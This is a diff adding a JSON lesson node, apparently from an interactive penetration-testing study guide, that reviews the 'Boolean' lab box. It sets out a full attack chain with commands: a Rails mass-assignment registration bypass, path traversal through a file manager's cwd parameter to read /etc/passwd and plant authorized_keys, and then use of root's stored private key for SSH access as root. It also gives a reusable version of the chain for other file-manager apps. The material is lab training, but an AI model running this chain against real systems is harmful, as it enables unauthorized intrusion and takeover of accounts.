@@ -1,0 +1,34 @@
+{
+  "id": "boolean_lessons",
+  "phase": "MINDSET",
+  "title": "Boolean Retrospective \u2014 File Manager Traversal to Root via Stored SSH Key",
+  "body": "Boolean was a mass-assignment registration bypass leading to a file manager with path traversal \u2014 two distinct primitives that chain to root via SSH key abuse. The box is deceptively simple but packed with recognition traps: a Rails app that tells you the attack syntax from its own cookies, a file manager that's actually a read/write-anywhere primitive, a root private key sitting unprotected in a user's home dir, and an SSH failure mode that looks like auth broken but is actually a client-side flag issue.\n\nChain: null-auth register -> mass assignment (confirmed:false -> true) -> file manager login -> path traversal cwd=../../../../home/remi/.ssh/ -> upload authorized_keys -> SSH as remi -> LinPEAS finds /home/remi/.ssh/keys/root (root's private key) -> SSH -i key -o IdentitiesOnly=yes root@localhost -> root.\n\n-- FIVE LESSONS --\n\n  1. RAILS TELLS YOU THE SYNTAX BEFORE YOU TEST ANYTHING\n     Two tells in the initial request: (a) Cookie: _boolean_session -> Rails,\n     means bracket syntax user[field]=value. (b) authenticity_token in the body\n     -> confirms Rails CSRF, confirms mass assignment model. When you see these,\n     you know before touching a single input that user[confirmed]=true is valid\n     syntax. Read the framework from the response, not the source code.\n\n  2. A FILE MANAGER IS A READ/WRITE-ANYWHERE PRIMITIVE\n     The cwd parameter controlled where the file manager operated. That's not\n     'just' an LFI \u2014 it's a full filesystem write primitive. The attack path:\n     read /etc/passwd (confirm traversal works), then WRITE authorized_keys to\n     /home/remi/.ssh/ (turn read into code execution). Any file manager with a\n     path parameter is a candidate for this. The curl-download URL pattern\n     (?cwd=&file=&download=true) is the tell for the Boolean box specifically.\n\n  3. KEYS STORED ON THE BOX ARE GOLD\n     LinPEAS flagged /home/remi/.ssh/keys/root \u2014 root's own private key left\n     in a user-readable directory. This is a common box pattern AND a real-world\n     misconfiguration (admins storing backup keys, deployment keys, etc.).\n     Always check: ~/.ssh/keys/, ~/.ssh/id_*, /opt/*/.ssh/, /var/backup/*.pem\n     Any private key file you can read is a potential lateral/vertical move.\n\n  4. SSH PROMPTING FOR PASSWORD DESPITE A KEY = CLIENT PROBLEM, NOT SERVER\n     The key existed, the permissions were right, but SSH went to password prompt\n     anyway. Cause: SSH was trying EVERY identity in the agent and hitting the\n     server's MaxAuthTries limit before reaching the right key.\n     Fix: -o IdentitiesOnly=yes forces SSH to use ONLY -i <key>, nothing else.\n     This is the #1 SSH key authentication failure mode. Add it to every ssh\n     command when key auth isn't working.\n\n  5. WHEN REMOTE SSH WITH A KEY FAILS, TRY LOCALHOST\n     After confirming the key was valid (ssh-keygen -y returned the public key),\n     the remote attempt still failed because the Kali SSH client was trying too\n     many identities. Using the key locally from remi's shell bypassed that\n     entirely: ssh -i /home/remi/.ssh/keys/root -o IdentitiesOnly=yes root@localhost\n     If you have a shell on the box and a key on the box, SSH localhost.\n\n-- REUSABLE CHAIN (file-manager web app) --\n\n  1. Register -> capture PATCH/settings -> read response JSON for boolean fields\n  2. Add user[confirmed]=true to request body (Rails: authenticity_token = tell)\n  3. Login -> find the file manager / path-parameter endpoint\n  4. curl ?cwd=../../../../etc/passwd or equivalent to confirm traversal\n  5. Generate SSH keypair -> upload authorized_keys to /home/<user>/.ssh/\n  6. SSH in -> run LinPEAS -> check ~/.ssh/keys/ for any stored private keys\n  7. ssh -i <found_key> -o IdentitiesOnly=yes root@localhost",
+  "cmd": "# \u2500\u2500 BOOLEAN PATTERN -- file manager -> SSH key upload -> root via stored key --\n\n# 1) MASS ASSIGNMENT (Rails tell: _boolean_session + authenticity_token)\n# Intercept PATCH /settings/email -> read JSON response for boolean fields\n# Add to body: &user[confirmed]=true -> confirmed:true -> log in\n\n# 2) FILE MANAGER TRAVERSAL (confirm read, then write)\n# Read:  http://$ip/?cwd=../../../../etc/&file=passwd&download=true\n# Write: upload authorized_keys with cwd=../../../../home/remi/.ssh/\nssh-keygen -q -N '' -f sshkey\nmv sshkey.pub authorized_keys\nchmod 600 sshkey\n# upload authorized_keys via file manager to /home/remi/.ssh/\n\n# 3) SSH AS REMI\nssh -i sshkey -o IdentitiesOnly=yes remi@$ip\n\n# 4) FIND ROOT KEY (LinPEAS finds it, or check manually)\nfind /home -name 'id_*' -o -name '*.pem' -o -name 'root' 2>/dev/null | grep -i ssh\nls -la /home/remi/.ssh/keys/\ncat /home/remi/.ssh/keys/root   # root's private key -- stored unprotected\n\n# 5) SSH AS ROOT -- USE IDENTITIESONLY OR IT FAILS\nssh -i /home/remi/.ssh/keys/root -o IdentitiesOnly=yes root@localhost\n# root@boolean:~# whoami -> root\ncat /root/proof.txt",
+  "warn": "Boolean's traps are all recognition failures: (1) if you don't know Rails by its cookie name, you miss that user[confirmed]=true is valid syntax and spend time guessing parameters; (2) if you treat the file manager as read-only you miss the write primitive for SSH key upload; (3) if you find a private key and SSH prompts for password, the fix is -o IdentitiesOnly=yes NOT 'the key is wrong'; (4) if remote SSH with a valid key fails, SSH localhost using the key on the box itself. The root key in /home/remi/.ssh/keys/ is world-readable \u2014 always check home directories for stored keys after foothold.",
+  "choices": [
+    {
+      "label": "Mass assignment \u2014 Rails bracket syntax",
+      "next": "burp_authn"
+    },
+    {
+      "label": "File manager / path traversal primitive",
+      "next": "lfi"
+    },
+    {
+      "label": "SSH key upload to authorized_keys",
+      "next": "ssh_key"
+    },
+    {
+      "label": "SSH key auth failing (IdentitiesOnly fix)",
+      "next": "ssh_key"
+    },
+    {
+      "label": "Back to lessons hub",
+      "next": "jump_lessons"
+    },
+    {
+      "label": "Back to Linux privesc checklist",
+      "next": "linux_privesc_checklist"
+    }
+  ]
+}
